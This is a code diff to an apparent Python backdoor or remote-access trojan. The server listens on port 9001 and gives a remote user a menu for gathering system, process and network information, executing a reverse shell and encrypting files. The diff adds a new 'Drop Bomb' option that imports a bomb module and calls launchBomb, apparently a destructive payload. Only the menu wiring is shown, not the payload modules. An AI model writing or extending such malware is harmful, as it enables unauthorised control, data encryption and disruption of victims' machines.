@@ -6,6 +6,7 @@ from files import *
 from usage import *
 from dropshell import *
 from encrypting import *
+from bomb import *
 host = '0.0.0.0'
 port = 9001 
 
@@ -36,7 +37,7 @@ def banner(con):
 
 def menu(con):
     banner(con)
-    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. Process Information\n3. Information about Mama\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File'
+    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. Process Information\n3. Information about Mama\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb'
     con.sendall(mainMenu)
     con.sendall(b'\nSpecify Option: ')
     opt = con.recv(1024)
@@ -58,6 +59,8 @@ def menu(con):
                 dropRevShell(con)
             elif(opt == 8):
                 encryptMenu(con)
+            elif(opt == 9):
+                launchBomb(con)
             else :
                 con.sendall(b'lol\n')
         except ValueError:
